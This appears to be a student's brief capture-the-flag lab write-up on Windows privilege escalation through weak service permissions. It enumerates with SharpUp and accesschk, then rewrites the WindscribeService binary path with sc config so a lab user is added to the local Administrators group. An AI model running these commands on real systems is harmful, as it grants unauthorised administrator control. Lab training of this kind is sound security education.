# [Weak Permissions](Weak%20Permissions.md)
### Escalate privileges on the target host using the techniques demonstrated in this section. Submit the contents of the flag in the WeakPerms folder on the Administrator Desktop.

```cmd
.\SharpUp.exe audit
```
![](Screenshot%202026-08-19%20at%2015.48.14.png)

Checking permissions with accesschk.exe
![](Screenshot%202026-08-19%20at%2015.51.55.png)

Check admin membership
![](Screenshot%202026-08-19%20at%2015.52.32.png)

Changing the service binary path

```cmd
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```
![](Screenshot%202026-08-19%20at%2015.53.12.png)

Next, we must stop the service, so the new `binpath` command will run the next time it is started.

```cmd
sc stop WindscribeService
```
![](Screenshot%202026-08-19%20at%2015.53.59.png)

Then we start it again
![](Screenshot%202026-08-19%20at%2015.54.37.png)

Confirmed
![](Screenshot%202026-08-19%20at%2015.54.57.png)

Just reset then run cmd as admin then type the flag
![](Screenshot%202026-08-22%20at%2015.04.15.png)